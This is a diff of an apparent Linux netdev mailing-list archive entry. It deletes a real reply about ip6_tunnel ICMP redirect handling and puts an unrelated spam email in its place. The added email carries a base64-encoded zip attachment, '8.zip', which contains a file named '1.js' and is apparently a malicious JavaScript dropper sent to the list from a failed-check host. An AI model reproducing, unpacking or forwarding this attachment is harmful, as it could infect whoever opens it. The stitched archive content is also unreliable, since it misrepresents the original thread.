@@ -1,35 +1,50 @@
-From: Cong Wang <xiyou.wangcong@gmail.com>
-Subject: Re: [PATCH net] ip6_tunnel: remove unreachable ICMP_REDIRECT code
-Date: Mon, 8 May 2017 13:26:48 -0700
-Message-ID: <CAM_iQpWAdKve_ZxG3n+uoz_We65RV95CaKydPFYobo+pQWvjjg@mail.gmail.com>
-References: <1494241863-32549-1-git-send-email-liuhangbin@gmail.com>
+From: <ccc@mail.com>
+Subject: 55346
+Date: Mon, 08 May 2017 20:48:21 -0000
+Message-ID: <149427650169.26666.10873891001054796136@fastnet.it>
 Mime-Version: 1.0
-Content-Type: text/plain; charset=UTF-8
-Cc: Linux Kernel Network Developers <netdev@vger.kernel.org>
-To: Hangbin Liu <liuhangbin@gmail.com>
+Content-Type: application/zip; name="8.zip"
+Content-Transfer-Encoding: base64
+To: <netdev@vger.kernel.org>
 Return-path: <netdev-owner@vger.kernel.org>
-Received: from mail-wm0-f45.google.com ([74.125.82.45]:36358 "EHLO
-        mail-wm0-f45.google.com" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
-        with ESMTP id S1752586AbdEHU1K (ORCPT
-        <rfc822;netdev@vger.kernel.org>); Mon, 8 May 2017 16:27:10 -0400
-Received: by mail-wm0-f45.google.com with SMTP id u65so98030400wmu.1
-        for <netdev@vger.kernel.org>; Mon, 08 May 2017 13:27:09 -0700 (PDT)
-In-Reply-To: <1494241863-32549-1-git-send-email-liuhangbin@gmail.com>
+Received: from ip185-28.55-190.fastnet.it ([185.28.55.190]:33008 "HELO
+        fastnet.it" rhost-flags-OK-FAIL-OK-FAIL) by vger.kernel.org with SMTP
+        id S1750737AbdEHUs2 (ORCPT <rfc822;netdev@vger.kernel.org>);
+        Mon, 8 May 2017 16:48:28 -0400
+Content-Disposition: attachment
 Sender: netdev-owner@vger.kernel.org
 List-ID: <netdev.vger.kernel.org>
 
-On Mon, May 8, 2017 at 4:11 AM, Hangbin Liu <liuhangbin@gmail.com> wrote:
-> After call ip6_tnl_err(), the rel_type will be ether ICMPV6_DEST_UNREACH
-> or ICMPV6_PKT_TOOBIG. We will never reach ICMP_REDIRECT. So remove it.
-
-Are you sure we really don't need to handle NDISC_REDIRECT here?
-
-I can't find anything in RFC 2473 explictly, but I am feeling we should handle
-it rather than ignoring it according to:
-
-   To report a problem detected inside the tunnel to the source of an
-   original packet, the tunnel entry point node must relay the ICMP
-   message received from inside the tunnel to the source of that
-   original IPv6 packet.
-
-I am not sure...
+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
